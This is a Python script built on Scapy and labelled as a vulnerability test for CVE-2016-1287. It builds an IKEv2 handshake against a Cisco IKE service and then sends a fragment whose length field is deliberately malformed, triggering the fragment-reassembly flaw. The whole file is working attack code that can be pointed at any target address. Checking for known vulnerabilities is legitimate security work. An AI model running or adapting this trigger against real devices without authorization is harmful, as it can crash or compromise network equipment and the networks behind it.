#!/usr/bin/env python

# Vulnerability test for CVE-2016-1287
#
# Jacob Gajek <jacob.gajek@esentire.com>

from scapy.all import *

DSTIP="1.1.1.1"
SRCIP="1.1.1.2"

LAST=0
MORE_PROPOSALS=2
MORE_TRANSFORMS=3

# IKEv2 Exchange Types
IKE_SA_INIT=34
IKE_AUTH=35
CREATE_CHILD_SA=36
INFORMATIONAL=37

# IKEv2 Header Flags
INITIATOR=0b00001000
VERSION=0b00010000
RESPONSE=0b00100000

# IKEv2 Payload Types
SECURITY_ASSOCIATION=33
KEY_EXCHANGE=34
IDENTIFICATION_INITIATOR=35
IDENTIFICATION_RESPONDER=36
CERTIFICATE=37
CERTIFICATE_REQUEST=38
AUTHENTICATION=39
NONCE=40
NOTIFY=41
DELETE=42
VENDOR_ID=43
TRAFFIC_SELECTOR_INITIATOR=44
TRAFFIC_SELECTOR_RESPONDER=45
ENCRYPTED=46
CONFIGURATION=47
EXTENSIBLE_AUTHENTICATION=48
CISCO_FRAGMENT=132

# Protocol IDs
IKE=1
AH=2
ESP=3

# Transform Types
ENCRYPTION_ALGORITHM=1
PSEUDORANDOM_FUNCTION=2
INTEGRITY_ALGORITHM=3
DIFFIE_HELLMAN=4

# Transform IDs - Encryption
ENCR_DES_IV64=1
ENCR_DES=2
ENCR_3DES=3
ENCR_RC5=4
ENCR_IDEA=5
ENCR_CAST=6
ENCR_BLOWFISH=7
ENR_3IDEA=8
ENCR_DES_IV32=9
ENCR_NULL=11
ENCR_AES_CBC=12
ENCR_AES_CTR=13

# Transform IDs - PRF
PRF_HMAC_MD5=1
PRF_HMAC_SHA1=2
PRF_HMAC_TIGER=3
PRF_AES128_XCBC=4

# Transform IDs - Integrity
AUTH_HMAC_MD5_96=1
AUTH_HMAC_SHA1_96=2
AUTH_DES_MAC=3
AUTH_KPDK_MD5=4
AUTH_AES_XCBC_96=5

# Transform IDs - Diffie-Hellman
DH_GROUP1=1
DH_GROUP2=2
DH_GROUP5=5

# Vendor IDs
CISCO_PRODUCTID="CISCO(COPYRIGHT)&Copyright (c) 2009 Cisco Systems, Inc."
CISCO_FRAGMENTATION="\x40\x48\xb7\xd5\x6e\xbc\xe8\x85\x25\xe7\xde\x7f\x00\xd6\xc2\xd3"

# Message ID
MSGID=0


def encode_byte(value):
    return chr(value & 0xff)

def encode_word(value):
    return (chr((value & 0xff00) >> 8) +
            chr((value & 0x00ff)))

def encode_dword(value):
    return (chr((value & 0xff000000) >> 24) +
            chr((value & 0x00ff0000) >> 16) +
            chr((value & 0x0000ff00) >> 8) +
            chr((value & 0x000000ff)))

def encode_qword(value):
    return (chr((value & 0xff00000000000000) >> 56) +
            chr((value & 0x00ff000000000000) >> 48) +
            chr((value & 0x0000ff0000000000) >> 40) +
            chr((value & 0x000000ff00000000) >> 32) +
            chr((value & 0x00000000ff000000) >> 24) +
            chr((value & 0x0000000000ff0000) >> 16) +
            chr((value & 0x000000000000ff00) >> 8) +
            chr((value & 0x00000000000000ff)))


def Transform(last_more, transform_type, transform_id, attributes=""):

    return (encode_byte(last_more) +
            encode_byte(0x00) +
            encode_word(8 + len(attributes)) +
            encode_byte(transform_type) +
            encode_byte(0x00) +
            encode_word(transform_id) +
            attributes)


def Proposal(last_more, proposal_seq, protocol_id, num_transforms, transforms):

    return (encode_byte(last_more) +
            encode_byte(0x00) +
            encode_word(8 + len(transforms)) +
            encode_byte(proposal_seq) +
            encode_byte(protocol_id) +
            encode_byte(0x00) +
            encode_byte(num_transforms) +
            transforms)


def Payload(next_payload, data):

    return (encode_byte(next_payload) +
            encode_byte(0x00) +
            encode_word(4 + len(data)) +
            data)


def Fragment(next_payload, fragment_id, sequence_num, last_fragment, data):

    return (encode_byte(next_payload) +
            encode_byte(0x00) +
            encode_word(8 + len(data)) +
            encode_word(fragment_id) +
            encode_byte(sequence_num) +
            encode_byte(last_fragment) +
            data)

def BadFragment(next_payload, fragment_id, sequence_num, last_fragment, data):

    return (encode_byte(next_payload) +
            encode_byte(0x00) +
            encode_word(0x01) +
            encode_word(fragment_id) +
            encode_byte(sequence_num) +
            encode_byte(last_fragment) +
            data)


def IKEv2(spi_initiator, spi_responder, next_payload, exchange_type, flags, payloads):

    return (spi_initiator +
            spi_responder +
            encode_byte(next_payload) +
            encode_byte(0x20) +
            encode_byte(exchange_type) +
            encode_byte(flags) +
            encode_dword(MSGID) +
            encode_dword(28 + len(payloads)) +
            payloads)


def sendFragment(fragment):

    data = IKEv2(spi_initiator, spi_responder, CISCO_FRAGMENT, IKE_AUTH, INITIATOR, fragment)
    packet = IP(src=SRCIP, dst=DSTIP) / UDP(sport=5000, dport=500) / data
    send(packet)


# Construct and send IKE_SA_INIT exchange to enable fragmentation support

transforms = (Transform(MORE_TRANSFORMS, ENCRYPTION_ALGORITHM, ENCR_3DES) +
              Transform(MORE_TRANSFORMS, PSEUDORANDOM_FUNCTION, PRF_HMAC_SHA1) +
              Transform(MORE_TRANSFORMS, INTEGRITY_ALGORITHM, AUTH_HMAC_SHA1_96) +
              Transform(LAST, DIFFIE_HELLMAN, DH_GROUP2))

proposals = Proposal(LAST, 1, IKE, 4, transforms)

key_exchange = "\x00\x02\x00\x00" + "\x00" * 64 + "\x01\x02\x03\x04\x05\x06\x07\x08" * 8

nonce = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x10\x11\x12\x13\x14\x15\x16"

spi_initiator = "\x01\x02\x03\x04\x05\x06\x07\x08"
spi_responder = "\x00\x00\x00\x00\x00\x00\x00\x00"

payloads = (Payload(KEY_EXCHANGE, proposals) +
            Payload(NONCE, key_exchange) +
            Payload(VENDOR_ID, nonce) +
            Payload(VENDOR_ID, CISCO_PRODUCTID) +
            Payload(LAST, CISCO_FRAGMENTATION))


data = IKEv2(spi_initiator, spi_responder, SECURITY_ASSOCIATION, IKE_SA_INIT, INITIATOR, payloads)

packet = IP(src=SRCIP, dst=DSTIP) / UDP(sport=5000, dport=500) / data
answer = sr1(packet)
spi_responder = answer[Raw].load[8:16]
MSGID += 1

# Send fragments

fragment = Fragment(CERTIFICATE, 1234, 1, 0, "This fragment has a normal length")
sendFragment(fragment)

fragment = BadFragment(CERTIFICATE, 1234, 2, 1, "This fragment has a bad length")
sendFragment(fragment)

